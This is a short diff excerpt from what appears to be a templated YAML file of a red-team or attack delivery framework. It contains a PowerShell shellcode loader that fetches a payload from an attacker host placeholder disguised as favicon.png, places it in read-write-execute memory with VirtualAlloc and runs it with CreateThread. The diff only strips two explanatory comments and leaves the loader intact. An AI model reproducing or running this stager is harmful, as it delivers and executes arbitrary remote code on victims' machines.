@@ -25,8 +25,6 @@ content: |+
   [Byte[]] $buf = (iwr "http://{{ attacker_ip }}:{{ delivery_outbound_port }}/favicon.png").Content
   $size = $buf.Length
 
-  # 0x3000 = MEM_COMMIT | MEM_RESERVE
-  # 0x40   = RWX
   [IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
   [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
   $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
